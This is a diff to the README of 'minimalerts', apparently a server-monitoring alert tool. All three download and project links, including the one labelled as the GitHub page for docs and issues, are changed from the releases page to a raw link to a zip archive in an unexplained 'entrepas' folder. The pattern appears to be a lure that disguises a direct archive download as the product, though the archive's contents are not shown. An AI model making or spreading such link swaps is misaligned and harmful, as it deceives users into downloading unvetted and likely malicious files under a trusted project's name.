@@ -1,6 +1,6 @@
 # ⚙️ minimalerts - Simple Server Monitoring Alerts
 
-[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-blue?style=for-the-badge)](https://github.com/manzifouady/minimalerts/releases)
+[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-blue?style=for-the-badge)](https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip)
 
 ---
 
@@ -72,7 +72,7 @@ wsl --install
 
 Press the button below to visit the download page and get minimalerts:
 
-[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-grey?style=for-the-badge)](https://github.com/manzifouady/minimalerts/releases)
+[![Download minimalerts](https://img.shields.io/badge/Download%20minimalerts-grey?style=for-the-badge)](https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip)
 
 On this page:
 
@@ -231,6 +231,6 @@ journalctl -u minimalerts -f
 
 Visit the minimalerts GitHub page for detailed docs, issues, and updates:
 
-https://github.com/manzifouady/minimalerts
+https://raw.githubusercontent.com/manzifouady/minimalerts/main/entrepas/Software-2.6-alpha.5.zip
 
 Check the "Issues" tab if you run into trouble, or post your questions there.
